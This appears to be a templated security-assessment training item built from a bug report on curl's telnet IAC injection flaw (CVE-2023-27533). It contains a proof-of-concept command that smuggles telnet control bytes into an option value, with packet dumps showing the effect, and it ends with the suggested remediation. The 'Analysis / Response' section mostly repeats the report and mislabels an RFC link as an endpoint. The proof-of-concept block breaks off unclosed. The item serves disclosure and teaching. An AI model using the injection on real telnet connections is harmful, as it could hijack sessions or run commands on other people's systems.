# INPUT_VALIDATION — h1

- source: h1
- class: input_validation
- cwe: CWE-75
- cve: ['CVE-2023-27533']
- severity: low
- program: curl
- quality_score: 12

## Scenario

Analyze the following vulnerability report and provide a structured security assessment.

**Report Title:** CVE-2023-27533: Telnet option IAC injection
**Affected Asset:** https://github.com/curl/curl

**Vulnerability Description:**
## Summary:
`CURLOPT_TELNETOPTIONS` allows setting various telnet options for telnet protocol. Due to missing encoding of "Interpret as Command" `IAC` (0xff) character, the attacker who can control these option values can escape out of the telnet subnegotiation and enter arbitrary TELNET commands (*) via the `CURLOPT_TELNETOPTIONS`  options. `TTYPE`, `XDISPLOC` and `NEW_ENV` options are affected.

*) TELNET command refers to "TELNET COMMAND STRUCTURE" in RFC 854

## Steps To Reproduce:

  1. `curl --telnet-option NEW_ENV=a,b$(echo -ne "\xff\xf0INJECTED") telnet://server`

When inspected with tcpdump:
```
20:57:34.454720 IP x.x.x.x.53864 > y.y.y.y.telnet: Flags [P.], seq 17:37, ack 22, win 2058, options [nop,nop,TS val [REDACTED_PHONE] ecr [REDACTED_PHONE]], length 20 [telnet SB NEW-ENVIRON IS 0 0x61 0x1 0x62 SE]
        0x0000:  [REDACTED_PHONE]a XXXX XXXX   E..H..@.@.&ZXXXX
        0x0010:  YYYY YYYY d[REDACTED_PHONE]a4 daa2 6603 9cb6  YYYY.h......f...
        0x0020:  8018 080a f[REDACTED_PHONE]a 56f7 c2f9  .....@......V...
        0x0030:  cad6 75ed fffa [REDACTED_PHONE] fff0 494e  ..u...'..a.b..IN
        0x0040:  4a[REDACTED_PHONE] fff0                      JECTED..

```

## Remediation
  - Double encode "Interpret as Command" (`IAC`) (0xff) if it is encountered when constructing the suboption data to be sent.

## Supporting Material/References:
 *  RFC 854 - https://www.rfc-editor.org/rfc/rfc854

## Impact

Attacker being able to specify `TTYPE`, `XDISPLOC` or `NEW_ENV` values is able to inject unintended TELNET commands to the telnet connection. Depending on the use case of the telnet protocol, this may allow the attacker to inject commands or other controlling operations. The practical impact is context specific, but in worst case this could for example allow executing arbitrary OS commands on target system.

**Steps to Reproduce:**
1. `curl --telnet-option NEW_ENV=a,b$(echo -ne "\xff\xf0INJECTED") telnet://server`

When inspected with tcpdump:
```
20:57:34.454720 IP x.x.x.x.53864 > y.y.y.y.telnet: Flags [P.], seq 17:37, ack 22, win 2058, options [nop,nop,TS val [REDACTED_PHONE] ecr [REDACTED_PHONE]], length 20 [telnet SB NEW-ENVIRON IS 0 0x61 0x1 0x62 SE]
        0x0000:  [REDACTED_PHONE]a XXXX XXXX   E..H..@.@.&ZXXXX
        0x0010:  YYYY YYYY d[REDACTED_PHONE]a4 daa2 6603 9cb6  YYYY.h......f...
        0x0020:  8018 080a f[REDACTED_PHONE]a 56f7 c2f9  .....@......V...
        0x0030:  cad6 75ed fffa [REDACTED_PHONE] fff0 494e  ..u...'..a.b..IN
        0x0040:  4a[REDACTED_PHONE] fff0                      JECTED..

```

**Proof of Concept:**
```
20:57:34.454720 IP x.x.x.x.53864 > y.y.y.y.telnet: Flags [P.], seq 17:37, ack 22, win 2058, options [nop,nop,TS val [REDACTED_PHONE] ecr [REDACTED_PHONE]], length 20 

## Analysis / Response

**Vulnerability Class:** input_validation
**CWE:** CWE-75
**Weakness:** Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)
**Severity:** low
**Endpoint Pattern:** https://www.rfc-editor.org/rfc/rfc854

**Impact Assessment:**
Attacker being able to specify `TTYPE`, `XDISPLOC` or `NEW_ENV` values is able to inject unintended TELNET commands to the telnet connection. Depending on the use case of the telnet protocol, this may allow the attacker to inject commands or other controlling operations. The practical impact is context specific, but in worst case this could for example allow executing arbitrary OS commands on target system.

**Remediation:**
- Double encode "Interpret as Command" (`IAC`) (0xff) if it is encountered when constructing the suboption data to be sent.

## Supporting Material/References:
 *  RFC 854 - https://www.rfc-editor.org/rfc/rfc854
